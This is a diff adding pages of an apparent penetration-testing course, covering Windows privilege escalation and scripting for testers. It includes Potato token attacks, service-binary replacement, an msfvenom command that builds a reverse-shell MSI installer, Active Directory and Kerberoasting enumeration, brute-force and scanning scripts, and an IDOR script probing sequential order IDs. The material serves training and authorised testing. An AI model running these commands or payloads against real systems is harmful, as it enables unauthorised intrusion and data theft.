+<div class="card"><h4>Linux Smart Enumeration</h4><p>github.com/diego-treitos/linux-smart-enumeration</p></div>
+<div class="card"><h4>BeRoot</h4><p>github.com/AlessandroZ/BeRoot</p></div>
+<div class="card"><h4>Traitor</h4><p>github.com/liamg/traitor (GTFOBins-driven)</p></div>
+</div>
+
+<h2>4.4 Windows for Pentesters</h2>
+<pre><code class="cmd">PS&gt; whoami /priv
+PS&gt; whoami /groups
+PS&gt; net user                    # List local users
+PS&gt; net localgroup administrators
+PS&gt; net view \\DC01             # Browse shares
+PS&gt; systeminfo
+PS&gt; wmic service list brief
+PS&gt; Get-Service | Where-Object {$_.Status -eq 'Running'}
+PS&gt; sc query type= service state= all
+PS&gt; tasklist /v
+PS&gt; Get-Process | Select Name, Id, CPU
+PS&gt; reg query HKLM /s          # Registry dump
+PS&gt; Get-ItemProperty 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run'
+PS&gt; Get-ScheduledTask
+PS&gt; Get-NetIPConfiguration
+PS&gt; Get-NetTCPConnection -State Established
+PS&gt; Get-DnsCache
+</code></pre>
+
+<h2>4.5 Windows Privilege Escalation</h2>
+<h3>4.5.1 Token Impersonation (Potato Attacks)</h3>
+<ul>
+  <li><strong>RottenPotato / JuicyPotato</strong> — Impersonate SYSTEM tokens</li>
+  <li><strong>SweetPotato</strong> — Modern equivalent, works on Win 10/11/Server</li>
+  <li><strong>PrintSpoofer</strong> — Abuses print spooler (still works post-PrintNightmare patches)</li>
+</ul>
+
+<pre><code class="cmd">PS&gt; .\SweetPotato.exe -p "C:\Windows\System32\cmd.exe" -a "/c whoami"
+nt authority\system ✨
+
+PS&gt; .\PrintSpoofer.exe -i -c cmd
+nt authority\system ✨
+</code></pre>
+
+<h3>4.5.2 Service Misconfigurations</h3>
+<pre><code class="cmd">PS&gt; accesschk.exe -uwcv "Everyone" * /accepteula
+PS&gt; icacls "C:\Program Files\VulnerableApp\service.exe"
+# If "Everyone:(M)" → modify → replace binary
+
+# Replace service
+PS&gt; sc stop VulnService
+PS&gt; copy payload.exe "C:\Program Files\VulnerableApp\service.exe"
+PS&gt; sc start VulnService
+</code></pre>
+
+<h3>4.5.3 AlwaysInstallElevated</h3>
+<pre><code class="cmd">PS&gt; reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+    AlwaysInstallElevated    REG_DWORD    0x1
+
+PS&gt; reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+    AlwaysInstallElevated    REG_DWORD    0x1
+
+# Generate malicious MSI
+$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.5 LPORT=4444 -f msi -o malicious.msi
+
+PS&gt; msiexec /quiet /qn /i malicious.msi
+</code></pre>
+
+<h3>4.5.4 Auto-Enumerators</h3>
+<div class="grid-3">
+<div class="card"><h4>winPEAS</h4><p>Awesome enum, color-coded</p></div>
+<div class="card"><h4>PowerUp</h4><p>PowerShell one-liner-friendly</p></div>
+<div class="card"><h4>Seatbelt</h4><p>GhostPack — comprehensive</p></div>
+<div class="card"><h4>SharpUp</h4><p>C# port of PowerUp</p></div>
+<div class="card"><h4>Watson</h4><p>.NET vulnerability scanner</p></div>
+<div class="card"><h4>Sherlock</h4><p>Finds missing KB patches</p></div>
+</div>
+
+<h2>4.6 Cross-Platform Pentester Toolkit</h2>
+<table>
+<tr><th>Tool</th><th>Purpose</th><th>Platform</th></tr>
+<tr><td>nmap</td><td>Network scanning</td><td>All</td></tr>
+<tr><td>Wireshark / tcpdump</td><td>Packet capture</td><td>All</td></tr>
+<tr><td>netcat / ncat</td><td>Swiss-army TCP/UDP</td><td>All</td></tr>
+<tr><td>Burp Suite Pro</td><td>Web proxy</td><td>All (Java)</td></tr>
+<tr><td>Metasploit Framework</td><td>Exploit dev &amp; payload delivery</td><td>Linux primarily</td></tr>
+<tr><td>John / Hashcat</td><td>Password cracking</td><td>All</td></tr>
+<tr><td>Hydra</td><td>Online brute-force</td><td>Linux</td></tr>
+<tr><td>CrackMapExec / NetExec</td><td>AD attack</td><td>Linux</td></tr>
+<tr><td>Mimikatz</td><td>Windows cred dumping</td><td>Windows</td></tr>
+<tr><td>Empire / Covenant</td><td>Post-ex C2</td><td>Cross</td></tr>
+<tr><td>BloodHound</td><td>AD attack paths</td><td>Cross</td></tr>
+</table>
+
+
+<!-- ============================================== -->
+<h1 id="ch5">🐍 Chapter 5 — Scripting for VAPT</h1>
+
+<p>A senior tester writes her own tools. This chapter teaches you the three essential
+languages of pentesting.</p>
+
+<h2>5.1 Python for Pentesters</h2>
+
+<h3>5.1.1 Port Scanner (your first tool)</h3>
+<pre><code class="cmd">#!/usr/bin/env python3
+import socket
+import argparse
+from concurrent.futures import ThreadPoolExecutor
+
+def scan_port(host, port, timeout=1):
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(timeout)
+        result = s.connect_ex((host, port))
+        s.close()
+        return port if result == 0 else None
+    except socket.gaierror:
+        return None
+
+def main():
+    parser = argparse.ArgumentParser(description='Fast port scanner')
+    parser.add_argument('host', help='Target host or IP')
+    parser.add_argument('-p', '--ports', default='1-1024',
+                        help='Port range (e.g. 1-1024 or 80,443,8080)')
+    parser.add_argument('-t', '--threads', type=int, default=100)
+    args = parser.parse_args()
+
+    ports = []
+    if '-' in args.ports:
+        start, end = map(int, args.ports.split('-'))
+        ports = range(start, end+1)
+    else:
+        ports = [int(p) for p in args.ports.split(',')]
+
+    print(f'[*] Scanning {args.host} ports {args.ports}')
+    with ThreadPoolExecutor(max_workers=args.threads) as ex:
+        results = ex.map(lambda p: scan_port(args.host, p), ports)
+
+    for port in results:
+        if port:
+            try:
+                banner = socket.getservbyport(port)
+                print(f'[+] {port}/tcp OPEN ({banner})')
+            except:
+                print(f'[+] {port}/tcp OPEN')
+
+if __name__ == '__main__':
+    main()</span>
+</code></pre>
+<pre><code class="cmd"># Usage
+$ chmod +x scanner.py
+$ ./scanner.py 192.168.1.1 -p 1-65535 -t 500
+</code></pre>
+
+<h3>5.1.2 Directory Brute-Forcer</h3>
+<pre><code class="cmd">#!/usr/bin/env python3
+import requests
+import argparse
+from concurrent.futures import ThreadPoolExecutor
+
+def check_dir(url, word):
+    try:
+        r = requests.get(f'{url}/{word}', timeout=3, allow_redirects=False)
+        return (r.status_code, word, len(r.content))
+    except:
+        return None
+
+def main():
+    parser = argparse.ArgumentParser()
+    parser.add_argument('url', help='Target URL (http://target.com)')
+    parser.add_argument('-w', '--wordlist', default='/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt')
+    parser.add_argument('-t', '--threads', type=int, default=20)
+    parser.add_argument('--status', default='200,301,302,403',
+                        help='Filter by status codes (comma-separated)')
+    parser.add_argument('--extensions', default='', help='e.g. .php,.html,.bak')
+    args = parser.parse_args()
+
+    wanted = set(map(int, args.status.split(',')))
+
+    with open(args.wordlist) as f:
+        words = [line.strip() for line in f if line.strip()]
+
+    print(f'[*] {len(words)} words, threads={args.threads}')
+    with ThreadPoolExecutor(max_workers=args.threads) as ex:
+        for status, word, length in ex.map(
+            lambda w: check_dir(args.url, w), words):
+            if status in wanted:
+                print(f'  [{status}] /{word}  ({length} bytes)')
+
+if __name__ == '__main__':
+    main()</span>
+</code></pre>
+
+<h3>5.1.3 Subdomain Takeover Checker</h3>
+<pre><code class="cmd">#!/usr/bin/env python3
+import dns.resolver
+import requests
+
+# Fingerprints of dangling CNAMEs orphaned services
+TAKEOVER_SERVICES = {
+    's3.amazonaws.com': 'claim S3 bucket',
+    'herokuapp.com': 'register Heroku app',
+    'azurewebsites.net': 'claim Azure web app',
+    'cloudfront.net': 'claim CloudFront distribution',
+    'github.io': 'register GitHub Pages repo',
+    'pantheon.io': 'claim Pantheon site',
+    'fastly.net': 'claim Fastly service',
+    'elasticbeanstalk.com': 'claim Elastic Beanstalk env',
+}
+
+def check_subdomain(sub):
+    try:
+        answers = dns.resolver.resolve(sub, 'CNAME')
+        for rdata in answers:
+            cname = str(rdata.target).rstrip('.')
+            for service, action in TAKEOVER_SERVICES.items():
+                if service in cname:
+                    try:
+                        r = requests.get(f'http://{sub}', timeout=5)
+                        if r.status_code in [404, 500] or 'NoSuchBucket' in r.text:
+                            return f'[🚨 VULN] {sub} → {cname} → {action}'
+                    except: pass
+    except dns.resolver.NoAnswer:
+        pass
+    except: pass
+    return None
+
+if __name__ == '__main__':
+    import sys
+    for sub in open(sys.argv[1]).read().splitlines():
+        result = check_subdomain(sub.strip())
+        if result: print(result)
+</code></pre>
+
+<h2>5.2 Bash Scripting — Glue for Linux Tools</h2>
+
+<pre><code class="cmd">#!/usr/bin/env bash
+# RudraScan — automated recon script
+
+set -euo pipefail
+TARGET=$1
+OUTDIR="./$TARGET-$(date +%s)"
+mkdir -p "$OUTDIR"
+
+echo "[*] Subdomain enum"
+subfinder -d "$TARGET" -silent | tee "$OUTDIR/subs.txt"
+
+echo "[*] Resolving live hosts"
+cat "$OUTDIR/subs.txt" | httpx -silent -status-code \
+  -o "$OUTDIR/live.txt"
+
+echo "[*] Nuclei vulnerability scan"
+nuclei -l "$OUTDIR/live.txt" -severity critical,high \
+  -o "$OUTDIR/nuclei.txt"
+
+echo "[*] Port scanning resolved IPs"
+dnsx -l "$OUTDIR/subs.txt" -resp -silent \
+  | naabu -silent -o "$OUTDIR/ports.txt"
+
+echo "[✓] Done. Results in $OUTDIR/"
+</code></pre>
+
+<h2>5.3 PowerShell for Windows</h2>
+
+<h3>5.3.1 Active Directory Enumeration (One-Liners)</h3>
+<pre><code class="cmd">PS&gt; Get-ADUser -Filter * -Properties PasswordLastSet,LastLogonDate | Sort-Object LastLogonDate | Select-Object Name,PasswordLastSet,LastLogonDate -First 20
+PS&gt; Get-ADGroup -Filter * -Properties Members | Where-Object {$_.Members.count -gt 50}
+PS&gt; Get-ADDomainController -Discover
+PS&gt; Get-ADTrust -Filter *
+PS&gt; Get-ADUser -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=2)" | Select Name,SamAccountName
+
+# Find AS-REP Roastable users (no preauth)
+PS&gt; Get-ADUser -Filter {DoesNotRequirePreAuth -eq "true"} -Properties DoesNotRequirePreAuth
+
+# Kerberoastable users
+PS&gt; Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName | Select Name,ServicePrincipalName
+</code></pre>
+
+<h3>5.3.2 PowerView — The AD Hacker's Swiss Army Knife</h3>
+<pre><code class="cmd">PS&gt; Import-Module PowerView.ps1
+PS&gt; Invoke-BloodHound -CollectionMethod All
+PS&gt; Get-DomainUser -SPN | Select Name,ServicePrincipalName
+PS&gt; Get-DomainGroupMember "Domain Admins" -Recurse
+PS&gt; Get-DomainComputer -Property DnsHostName,OperatingSystem | Select Name,OperatingSystem
+PS&gt; Find-LocalAdminAccess              # Find machines your user is admin on
+PS&gt; Get-NetSession -ComputerName DC01  # Who's logged in where
+PS&gt; Invoke-ShareFinder -CheckShareAccess
+</code></pre>
+
+<h2>5.4 Real-Life Scenario: Building a Custom Tool</h2>
+
+<div class="scenario">
+<h3>📍 Scenario — E-Commerce Giant "ShopKart" Needs a Targeted Tool</h3>
+<p>ShopKart's bug bounty program is flooded with low-skill submissions for generic scanners.
+A star researcher builds a custom <strong>ShopKart-specific IDOR hunter</strong>:</p>
+
+<pre><code class="cmd">#!/usr/bin/env python3
+"""
+ShopKart IDOR Hunter — replaces user_id=X with sequential values,
+detects when response size differs (potential data leak).
+"""
+import requests, json, sys
+
+BASE = "https://api.shopkart.com/v1/orders/"
+TOKEN = "Bearer eyJhbGc..."  # Authorised token of YOUR account
+
+def baseline(session):
+    r = session.get(BASE + "123456")
+    return r.status_code, r.text
+
+def check_idor(target_user_id):
+    s = requests.Session()
+    s.headers['Authorization'] = TOKEN
+    r = s.get(BASE + str(target_user_id))
+    if r.status_code == 200 and len(r.text) &gt; 50 and 'order' in r.text:
+        print(f'[🚨] {target_user_id} → {r.text[:200]}...')
+        return True
+    return False
+
+if __name__ == "__main__":
+    # Sequentially probe 100,000 user IDs
+    for uid in range(100000, 200000):
+        if uid % 1000 == 0: print(f'[*] Probing {uid}...')
+        check_idor(uid)
+
+</code></pre>
+
+<p><strong>Outcome:</strong> The researcher finds an IDOR exposing 4.2M customer orders. ShopKart
+pays a <strong>$25,000 bounty</strong> — the tool paid for the season.</p>
+</div>
+
+<h2>5.5 Decision Tree: When to Script vs Use a Tool?</h2>
+<div class="diagram">
+              ┌────────────────────────┐
+              │  Need capability X?    │
+              └────────────┬───────────┘
+                           │
+            ┌──────────────┴───────────────┐
+            ▼                              ▼
+   ┌─────────────────┐          ┌─────────────────┐
+   │  Widely used    │          │  Niche / custom │
+   │  tool exists?   │          │  target?        │
+   └────────┬────────┘          └────────┬────────┘
+            │                             │
+            ▼                             ▼
+   ┌──────────────────┐         ┌──────────────────┐
+   │  Use the tool    │         │  Write a script  │
+   │  (nmap, sqlmap)  │         │  Python/Bash     │
+   └──────────────────┘         └──────────────────┘
+            │
+            ▼
+   ┌────────────────────────┐
+   │  Needs automation?     │── YES ──► Wrap in script
+   │  or chaining?          │
+   └────────────────────────┘
+</div>
+
+</main>
+
+<nav class="next-prev">
+<a href="../index.html" class="prev">⬅ Home</a>
+<a href="part2-web.html" class="next">Part 2 — Web Application VAPT ➡</a>
+</nav>
+
+</body>
+</html>
